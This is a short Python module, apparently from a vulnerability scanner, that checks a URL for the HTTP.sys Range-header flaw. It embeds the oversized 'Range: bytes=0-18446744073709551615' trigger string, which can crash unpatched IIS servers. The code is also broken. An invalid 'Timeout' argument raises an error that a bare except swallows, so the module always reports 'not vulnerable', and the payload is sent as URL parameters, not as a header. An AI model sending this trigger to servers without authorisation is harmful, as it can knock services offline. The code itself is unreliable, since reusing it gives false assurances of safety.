# -*- encoding: utf-8 -*-
'''
@File : http.sys.py
@Time : 2019/07/06 23:22:19
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''

from lib import *
from fake_useragent import UserAgent
import requests
import re
import sys

def httpsys(domain):
    try:
        print('\n')
        print(Vcolors.OKBLUE + "正在对目标url进行HTTP.sys远程命令执行漏洞探测~~" + Vcolors.ENDC)
        ua = UserAgent(verify_ssl=False)
        headers = {'User-Agent':ua.random}
        req = requests.get(str(domain),Timeout = 5)
        vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        req = requests.get(str(domain), headers = headers, params=vuln_buffer,timeout = 5)
        if req.status_code == 416 :
            print(Vcolors.RED +  "存在HTTP.sys远程命令执行漏洞" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +  "不存在HTTP.sys远程命令执行漏洞" + Vcolors.ENDC)
    except :
        print(Vcolors.OKGREEN +  "不存在HTTP.sys远程命令执行漏洞" + Vcolors.ENDC)
